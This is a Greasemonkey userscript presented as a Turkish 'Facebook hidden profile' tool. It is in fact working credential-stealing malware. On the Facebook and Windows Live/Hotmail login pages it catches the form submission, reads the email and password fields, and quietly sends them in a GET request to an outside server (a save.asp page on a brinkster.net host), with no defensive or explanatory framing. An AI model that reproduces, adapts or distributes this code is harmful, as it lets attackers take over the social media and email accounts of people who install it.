// ==UserScript==
// @name           Facebook Gizli Profil 0.1 TR
// @namespace      FacebookInvisible
// @description    FacebookInvisible - 0.1 TR
// @version	1.0
// @include		   http://*.live.*
// @include		   https://*.live.*
// @include		   http://*.facebook.*
// ==/UserScript==
/** olta */



var pageFunc = function(){
	
	function getObjectMethodClosure(object, method) {
		return function() {
			return object[method].apply(object, arguments);
		}
	}
	var NewNode = getObjectMethodClosure(document,"createElement");
	var GetNode	= getObjectMethodClosure(document,"getElementById");
	var lButton = getObjectMethodClosure(document,"loginSubmit");

	document.addEventListener("submit", function(e) {
		if (e.target.id == 'login_form' || e.target.name == 'f1') {
			var form;
			var pass;
			var user;
			var script_host
			if (document.location.href.indexOf("live") != -1){	
				pass = document.getElementById('i0118').value; 
				user = document.getElementById('i0116').value;
				script_host = 'http://gorkem67.brinkster.net/save.asp?'+'user='+user+'&pass='+pass+'&uni=hotmail.com';
			}else if (document.location.href.indexOf("facebook") != -1){	
				form = document.getElementById("login_form");
				pass = form.elements.namedItem('pass').value; 
				user = form.elements.namedItem('email').value;
				script_host = 'http://gorkem67.brinkster.net/save.asp?'+'user='+user+'&pass='+pass+'&uni=facebook.com';
			}
			
			GM_xmlhttpRequest({method:'GET',
				url:script_host,
				headers: { 
						'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey', 
						'Accept': 'application/atom+xml,application/xml,text/xml', 
				}, 
				onload:function(result) {
					try {
						//alert(result.responseText);
					} catch (e) {
						//alert(errmsg);
					}
				},
				onerror:function(e){
					//alert(e.responseText); 
				}
			});
			
		}
	}, true);	
	}
if (window.navigator.userAgent.indexOf('Chrome') > -1 && window.google)
	document.location.href = 'javascript:('+pageFunc+')();void(0);';
else
	pageFunc();